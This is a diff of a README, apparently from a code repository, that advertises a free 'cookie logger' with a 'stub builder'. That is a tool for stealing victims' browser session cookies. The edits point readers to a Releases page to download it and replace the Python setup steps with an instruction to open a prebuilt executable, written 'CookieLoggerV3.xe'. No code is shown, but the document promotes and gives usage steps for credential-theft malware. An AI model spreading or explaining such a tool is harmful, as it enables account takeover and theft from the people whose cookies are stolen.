@@ -1,4 +1,4 @@
-# This Is The Best Free Cookie Logger That Uses A Stub Builder
+# This Is The Best Free Cookie Logger That Uses A Stub Builder Go To Releases To Download
 
 ![download](https://user-images.githubusercontent.com/108227869/177584583-e468fb2a-d8c8-4cf8-9d26-0fbc75e3bc6c.gif)
 
@@ -29,7 +29,7 @@ step 0; if you dont have python3 installed go to https://www.python.org/download
 
 Step 1; Download Zip and extract
 
-Step 2; Go To CMD cd to the directory where you saved CookieLoggerV3.py the run: pip3 install -r requirements.txt and wait the run: python3 CookieLoggerV3.py
+Step 2; Open CookieLoggerV3.xe
 
 Step 3; Wait For gui to load
 
